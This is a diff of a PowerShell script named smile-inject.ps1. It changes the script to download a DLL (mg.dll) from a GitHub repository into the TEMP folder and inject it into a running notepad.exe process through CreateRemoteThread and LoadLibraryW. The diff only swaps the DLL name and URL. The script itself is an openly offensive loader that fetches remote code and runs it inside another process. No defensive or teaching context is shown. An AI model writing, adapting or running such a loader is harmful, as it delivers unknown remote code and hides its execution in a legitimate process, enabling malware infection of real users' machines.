@@ -1,8 +1,8 @@
 # smile-inject.ps1
-# Downloads smile.dll and injects it into notepad.exe (CreateRemoteThread + LoadLibraryW)
+# Downloads mg.dll and injects it into notepad.exe (CreateRemoteThread + LoadLibraryW)
 
-$DllUrl    = "https://raw.githubusercontent.com/sahilvetrix-tech/smile.dll/main/smile.dll"
-$DllLocal  = Join-Path $env:TEMP "smile.dll"
+$DllUrl    = "https://github.com/nulltech592/ai/blob/main/mg.dll"
+$DllLocal  = Join-Path $env:TEMP "mg.dll"
 
 # ---- 0. Helpers ----
 function Get-PEArchitecture {
@@ -22,7 +22,7 @@ function Get-PEArchitecture {
 }
 
 # ---- 1. Download the DLL ----
-Write-Host "[*] Downloading smile.dll from $DllUrl"
+Write-Host "[*] Downloading mg.dll from $DllUrl"
 Invoke-WebRequest -Uri $DllUrl -OutFile $DllLocal -UseBasicParsing
 if (-not (Test-Path $DllLocal)) { throw "Download failed" }
 
@@ -124,4 +124,4 @@ public class DllInjector
 
 Add-Type -TypeDefinition $csharp -Language CSharp
 [DllInjector]::Inject($target.Id, $DllLocal)
-Write-Host "[+] smile.dll ($DllLocal) injected into notepad.exe PID $($target.Id)"
+Write-Host "[+] mg.dll ($DllLocal) injected into notepad.exe PID $($target.Id)"
